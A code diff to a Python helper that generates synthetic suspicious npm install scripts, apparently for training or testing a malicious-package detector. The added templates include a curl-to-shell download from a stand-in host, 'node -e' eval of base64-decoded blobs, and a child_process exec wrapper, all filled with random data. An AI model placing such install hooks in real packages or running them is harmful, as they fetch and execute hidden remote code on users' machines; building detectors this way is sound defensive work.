@@ -97,13 +97,14 @@ def random_entropy_blob(min_len=80, max_len=200):
     alphabet = string.ascii_letters + string.digits + "+/="
     return "".join(random.choice(alphabet) for _ in range(n))
 
-# Create random sus install script
+# Create random sus install script (each has at least one sus indicator)
 def subtle_script_string():
     templates = [
-        "node tools/setup.js",
-        "node scripts/postinstall.js",
+        "node -e \"require('child_process').exec('node tools/setup.js')\"",
         "node -e \"{}\"".format(random_entropy_blob()),
-        "node scripts/build.js",
+        "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(random_entropy_blob(60, 120)),
+        "curl -s http://cdn-assets-{}.io/setup.sh | sh".format(random.randint(100, 999)),
+        "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(random_entropy_blob(80, 150)),
     ]
     return random.choice(templates)
 
